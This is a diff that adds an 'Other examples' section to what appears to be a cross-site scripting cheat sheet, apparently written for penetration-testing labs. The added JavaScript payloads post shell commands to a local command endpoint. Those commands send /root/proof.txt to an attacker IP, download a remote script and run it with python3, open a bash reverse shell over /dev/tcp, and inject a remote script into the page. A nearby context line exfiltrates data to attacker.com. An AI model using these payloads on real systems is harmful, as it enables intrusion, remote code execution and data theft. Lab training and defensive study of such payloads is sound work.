@@ -834,6 +834,53 @@ Function('ale'+'rt(1)')()
 <img src='//attacker.com?data=
 ```
 
+#### 9. Other examples
+```javascript
+const params = new URLSearchParams();
+params.append('cmd', 'curl 192.168.45.240/$(cat /root/proof.txt)');
+
+fetch('http://localhost:3000/run_command', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: params.toString()
+});
+```
+
+```javascript
+fetch('http://localhost:3000/run_command', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: "cmd=curl Kali_IP/evil2.py | python3"
+ 
+}).then(function(response) {
+    response.text().then(function(text) {
+    window.location.href="http://LOCAL_IP/a?b=" + btoa(text);
+    });
+});
+```
+```javascript
+fetch("http://192.168.45.242:8888/k");
+
+fetch("http://localhost:3000/run_command", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: new URLSearchParams({ cmd: "bash -c 'bash -i >& /dev/tcp/192.168.45.242/4444 0>&1'" })
+});
+```
+```javascript
+// fetch("http://192.168.45.242:8888/p.js")
+var script = document.createElement('script');
+script.src = 'http://192.168.45.242:8888/p.js';
+document.body.appendChild(script);
+```
+
+
 ---
 
 ## Prevention & Mitigation
